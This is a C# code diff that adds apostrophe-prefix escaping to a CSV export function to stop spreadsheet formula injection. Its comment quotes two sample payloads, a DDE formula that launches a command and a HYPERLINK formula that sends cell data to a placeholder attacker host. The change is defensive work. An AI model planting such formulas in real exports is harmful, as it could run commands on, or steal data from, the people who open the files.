@@ -325,8 +325,21 @@ public sealed class CsvService(QueryService queries, EntryService entries)
         _         => v.ToString() ?? "",
     };
 
+    // CSV formula injection (a.k.a. DDE injection): Excel, LibreOffice and Google
+    // Sheets evaluate a cell as a formula when its text starts with `=`, `+`, `-`,
+    // `@`, TAB or CR — and they do so *after* stripping the RFC 4180 quotes, so
+    // quoting is not a defense. Every cell here is attacker-supplied content (a
+    // low-privilege user setting displayname.en to `=cmd|'/c calc.exe'!A0` or
+    // `=HYPERLINK("https://evil.tld/?d="&A1&A2,"Open")`) that an admin later opens
+    // from /managed/csv. Prefixing a single quote is the spreadsheet-universal
+    // "treat the rest as literal text" marker, so neutralize first and then apply
+    // the normal quoting rules. Deliberately export-side only: ImportAsync does not
+    // strip the prefix, so an export→re-import cycle keeps the leading apostrophe
+    // on an affected cell — a visible artifact is preferable to a live formula.
     private static string EscapeField(string s)
     {
+        if (s.Length > 0 && s[0] is '=' or '+' or '-' or '@' or '\t' or '\r')
+            s = $"'{s}";
         if (s.Contains(',') || s.Contains('"') || s.Contains('\n') || s.Contains('\r'))
             return $"\"{s.Replace("\"", "\"\"")}\"";
         return s;
